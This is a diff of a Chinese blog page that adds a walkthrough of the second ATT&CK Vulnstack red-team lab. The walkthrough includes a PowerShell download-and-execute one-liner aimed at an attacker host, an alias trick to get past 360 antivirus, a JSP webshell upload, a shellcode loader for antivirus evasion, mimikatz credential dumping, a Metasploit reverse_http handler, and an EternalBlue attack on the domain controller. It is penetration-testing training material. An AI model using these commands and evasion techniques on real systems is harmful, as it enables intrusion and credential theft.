@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="att&amp;ck红队评估实战靶场一, HTML,CSS,JavaScript,php,python,linux,mysql等">
+    <meta name="keywords" content="att&amp;ck红队评估实战靶场, HTML,CSS,JavaScript,php,python,linux,mysql等">
     <meta name="description" content="专注web，分享生活，分享知识">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>att&amp;ck红队评估实战靶场一 | Script kiddie&#39;s life</title>
+    <title>att&amp;ck红队评估实战靶场 | Script kiddie&#39;s life</title>
     <link rel="icon" type="image/jpeg" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/favicon.jpg">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/Lmg66/Lmg66.github.io/libs/awesome/css/all.css">
@@ -719,7 +719,7 @@
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">att&amp;ck红队评估实战靶场一</h1>
+                    <h1 class="description center-align post-title">att&amp;ck红队评估实战靶场</h1>
                 </div>
             </div>
         </div>
@@ -883,7 +883,11 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="att-amp-ck红队评估实战靶场一"><a href="#att-amp-ck红队评估实战靶场一" class="headerlink" title="att&amp;ck红队评估实战靶场一"></a>att&amp;ck红队评估实战靶场一</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载地址:<br><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a><br>解压，使用VMware打开三个虚拟机<br><img src="/images/pasted-434.png" alt="upload successful"><br>因为靶机是放在内网服务器上,而不上自己本机所以需要设置一下<br>web服务的虚拟机桥接模式，让主路由下的主机可以访问到，让后设置一下网卡的优先级，原因:因为连接了域控，而域控的主机god.org在公网是有的，所以采用网卡优先级来让其先走内网的域控，将内网网卡优先级调整到最高，我是这样解决的，反正能用(如果在本机vmware搭建就不用这一步，只需要开启phpstudy检测网络连通性)<br><img src="/images/pasted-436.png" alt="upload successful"><br><img src="/images/pasted-435.png" alt="upload successful"><br><img src="/images/pasted-437.png" alt="upload successful"></p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>全部靶场下载地址:<a href="http://vulnstack.qiyuanxuetang.net/vuln/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/</a></p>
+<p>初学内网渗透，很多不了解，如有错误还请师傅们指点</p>
+<h2 id="att-amp-ck红队评估实战靶场一"><a href="#att-amp-ck红队评估实战靶场一" class="headerlink" title="att&amp;ck红队评估实战靶场一"></a>att&amp;ck红队评估实战靶场一</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>下载地址:<br><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a><br>解压，使用VMware打开三个虚拟机<br><img src="/images/pasted-434.png" alt="upload successful"></p>
+<p>该靶机通用密码:hongrisec@2019</p>
+<p>因为靶机是放在内网服务器上,而不上自己本机所以需要设置一下<br>web服务的虚拟机桥接模式，让主路由下的主机可以访问到，让后设置一下网卡的优先级，原因:因为连接了域控，而域控的主机god.org在公网是有的，所以采用网卡优先级来让其先走内网的域控，将内网网卡优先级调整到最高，我是这样解决的，反正能用(如果在本机vmware搭建就不用这一步，只需要开启phpstudy检测网络连通性)<br><img src="/images/pasted-436.png" alt="upload successful"><br><img src="/images/pasted-435.png" alt="upload successful"><br><img src="/images/pasted-437.png" alt="upload successful"></p>
 <h3 id="靶机拿webshell"><a href="#靶机拿webshell" class="headerlink" title="靶机拿webshell"></a>靶机拿webshell</h3><p>基础信息收集</p>
 <pre><code>nmap -A 192.168.10.173</code></pre><pre><code>Not shown: 991 filtered ports
 PORT     STATE SERVICE            VERSION
@@ -1021,6 +1025,74 @@ set RHOST 192.168.52.138
 run</code></pre><p><img src="/images/pasted-488.png" alt="upload successful"><br><img src="/images/pasted-489.png" alt="upload successful"><br>成功获得域控权限</p>
 <h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://zhuanlan.zhihu.com/p/326150941" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/326150941</a><br><a href="https://zhuanlan.zhihu.com/p/358131340" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/358131340</a><br><a href="https://www.shuzhiduo.com/A/x9J2NwpEJ6/" target="_blank" rel="noopener">https://www.shuzhiduo.com/A/x9J2NwpEJ6/
 </a></p>
+<h2 id="att-amp-ck红队评估实战靶场二"><a href="#att-amp-ck红队评估实战靶场二" class="headerlink" title="att&amp;ck红队评估实战靶场二"></a>att&amp;ck红队评估实战靶场二</h2><h3 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>靶机通用密码：  1qaz@WSX<br>记得恢复到快照v1.3</p>
+<p><img src="/images/pasted-491.png" alt="upload successful"><br>如果你遇到这个问题</p>
+<p><img src="/images/pasted-492.png" alt="upload successful"><br>选择“保留”还是“放弃”，此时选择“放弃”，然后重启虚拟机就可以了<br>恢复后又发现问题</p>
+<p><img src="/images/pasted-493.png" alt="upload successful"><br>域控命令都无法连接到域控<br>需要再服务中<br>启动这项服务，不知整的对不对，运行没问题了，有问题还请大佬指点<br><img src="/images/pasted-494.png" alt="upload successful"></p>
+<p><img src="/images/pasted-495.png" alt="upload successful"><br>由于我网络的特殊性，靶机是搭建再服务器上的web服务器vm需要桥接，才能被访问最后配置如下(可以访问web主机就不用配了)</p>
+<p>web主机的</p>
+<p><img src="/images/pasted-496.png" alt="upload successful"><br>最后启动Weblogic<br>在</p>
+<pre><code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code></pre><p>目录，使用<strong>管理员cmd</strong></p>
+<pre><code>startWebLogic</code></pre><p><img src="/images/pasted-497.png" alt="upload successful"><br>访问</p>
+<pre><code>http://192.168.10.176:7001/console/login/LoginForm.jsp</code></pre><p><img src="/images/pasted-498.png" alt="upload successful"><br>搭建完成</p>
+<h3 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h3><p>先nmap扫描信息</p>
+<pre><code>nmap -A 192.168.10.176</code></pre><p>扫描到WebLogic 竟然还能扫描到web.de1ay.com<br><img src="/images/pasted-499.png" alt="upload successful"><br>WebLogic涉及java相关的没怎么学过这里就先脚本梭哈了<br>工具地址</p>
+<pre><code>链接：https://pan.baidu.com/s/1TNHMh3DNh8G86eUlb761kA 提取码：i8u0</code></pre><p><img src="/images/pasted-500.png" alt="upload successful"><br>这里通过powershell 命令<br>利用downloadstri远程读取powershell文件并iex执行<br>iex =&gt; Invoke-expression 将字符串当作powershell代码执行<br><img src="/images/pasted-501.png" alt="upload successful"></p>
+<p><img src="/images/pasted-502.png" alt="upload successful"></p>
+<pre><code>powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.10.232:80/a&#39;))&quot;</code></pre><p>执行命令完成发现，并没上线，一看有360，啊这</p>
+<p><img src="/images/pasted-504.png" alt="upload successful"></p>
+<p><img src="/images/pasted-503.png" alt="upload successful"><br>将其ie改为别名试试</p>
+<pre><code>powershell set-alias -name cseroad -value Invoke-Expression;cseroad(New-Object Net.WebClient).DownloadString(&#39;http://192.168.10.232:80/a&#39;)</code></pre><p><img src="/images/pasted-505.png" alt="upload successful"><br>啊这还是拦截，刚学内网都遇见360<br>先上传shell吧<br>参考地址<br><a href="https://www.cnblogs.com/sstfy/p/10350915.html" target="_blank" rel="noopener">https://www.cnblogs.com/sstfy/p/10350915.html</a></p>
+<pre><code>C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</code></pre><p><img src="/images/pasted-506.png" alt="upload successful"><br>冰蝎连接<br><img src="/images/pasted-507.png" alt="upload successful"></p>
+<p><img src="/images/pasted-508.png" alt="upload successful"></p>
+<h3 id="如何免杀360"><a href="#如何免杀360" class="headerlink" title="如何免杀360"></a>如何免杀360</h3><p>为了免杀360专门看看了免杀相关的<br>写了个小工具，地址:</p>
+<pre><code>https://github.com/Lmg66/shellcodeloading</code></pre><p>生成一个木马文件<br>注意个这个注释掉，因为靶机系统盘不到45g</p>
+<p><img src="/images/pasted-519.png" alt="upload successful"></p>
+<p><img src="/images/pasted-520.png" alt="upload successful"></p>
+<p><img src="/images/pasted-510.png" alt="upload successful"><br>重命名一下2.exe<br>上传到C:/根目录</p>
+<p><img src="/images/pasted-511.png" alt="upload successful"></p>
+<p>先不要直接运行，直接运行会被360直接杀掉</p>
+<p>我们可以测试一下，<br>写了个</p>
+<pre><code>package main
+
+import &quot;fmt&quot;
+
+func main() {
+    fmt.Println(&quot;hello world！&quot;)
+}</code></pre><p>简单的打印hello world！编译为exe文件<br>命名为1.exe文件运行尝试<br><img src="/images/pasted-512.png" alt="upload successful"></p>
+<p>ps：妈的这玩意好玄学啊(写博客的时候又试了试)<br>又能执行了<br><img src="/images/pasted-513.png" alt="upload successful"><br>直接运行2.exe还是拦截<br><img src="/images/pasted-514.png" alt="upload successful"><br>创建个批处理文件试试，重新上传一个shellcode.exe<br><img src="/images/pasted-517.png" alt="upload successful"><br>成功绕过360<br><img src="/images/pasted-521.png" alt="upload successful"></p>
+<p><img src="/images/pasted-522.png" alt="upload successful"></p>
+<h3 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h3><p>先查看系统的<br>AMD64的，安装的软件就sql server c++ c基本环境<br><img src="/images/pasted-526.png" alt="upload successful"><br>查看进程的其他杀软</p>
+<pre><code>tasklist /SVC</code></pre><p><a href="http://ddoslinux.com/windows/index.php" target="_blank" rel="noopener">http://ddoslinux.com/windows/index.php</a><br>只有360<br><img src="/images/pasted-523.png" alt="upload successful"><br>网络信息收集<br>有两网卡<br><img src="/images/pasted-524.png" alt="upload successful"><br>查看一下域吧</p>
+<p>可以看到是有域环境的<br><img src="/images/pasted-525.png" alt="upload successful"></p>
+<p><img src="/images/pasted-528.png" alt="upload successful"><br>怎么还拒绝访问呢？？看了一下也是域下面的用户啊</p>
+<p>大佬知道还请告之万分感谢</p>
+<p>不过不影响，看下网络环境</p>
+<p><img src="/images/pasted-529.png" alt="upload successful"><br>域控应该就是10.10.10.10了<br>利用icmp协议快速探测内网<br>快速探测内网</p>
+<pre><code>for /L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL=&quot;</code></pre><p><img src="/images/pasted-532.png" alt="upload successful"><br><img src="/images/pasted-530.png" alt="upload successful"><br>用了这个扫描结果差不多，好像还有MS17-010<br><a href="https://github.com/shadow1ng/fscan" target="_blank" rel="noopener">https://github.com/shadow1ng/fscan</a><br><img src="/images/pasted-531.png" alt="upload successful"><br>通过hashdump列出机器内的用户hash，利用cs自带的mimikatz中logonpassword模块进行破解，最终得到相关域用户的hash明文<br><img src="/images/pasted-533.png" alt="upload successful"><br>psexec利用域管令牌攻击：</p>
+<p><img src="/images/pasted-534.png" alt="upload successful"></p>
+<p><img src="/images/pasted-539.png" alt="upload successful"></p>
+<p><img src="/images/pasted-538.png" alt="upload successful"><br><img src="/images/pasted-537.png" alt="upload successful"><br>我靠被拦截了</p>
+<p>想提权有360估计白给</p>
+<p><img src="/images/pasted-540.png" alt="upload successful"><br>没办法了试了几种办法各种360各种拦截</p>
+<p><img src="/images/pasted-541.png" alt="upload successful"><br>之前扫描有ms17_010</p>
+<p>只能ms17_010一把梭哈啊，还好域控没有360<br>cs派生</p>
+<p><img src="/images/pasted-543.png" alt="upload successful"><br>MSF中配置监听</p>
+<pre><code>配置监听器 msf&gt; use exploit/multi/handler 
+# 选择payload msf&gt; windows/meterpreter/reverse_http
+msf&gt; set lhost IP msf&gt; set lport port 
+# 启动监听器 msf&gt; set ExitOnSession False
+msf&gt; run -jz</code></pre><p><img src="/images/pasted-544.png" alt="upload successful"></p>
+<p><img src="/images/pasted-545.png" alt="upload successful"></p>
+<p><img src="/images/pasted-546.png" alt="upload successful"></p>
+<p><img src="/images/pasted-547.png" alt="upload successful"><br>成功接收到</p>
+<p><img src="/images/pasted-548.png" alt="upload successful"><br>梭哈梭哈</p>
+<pre><code>添加路由
+run autoroute -s 10.10.10.0/24
+查看当前已经添加的路由
+run autoroute -p</code></pre><p><img src="/images/pasted-549.png" alt="upload successful"><br>进行永恒之蓝操作<br><img src="/images/pasted-551.png" alt="upload successful"></p>
+<p><img src="/images/pasted-552.png" alt="upload successful"><br>360属实恶心啊</p>
+<p>膜拜半凉一夏大佬:<a href="https://www.bilibili.com/video/BV1Ai4y1M7S1" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1Ai4y1M7S1</a></p>
 
             </div>
             <hr/>
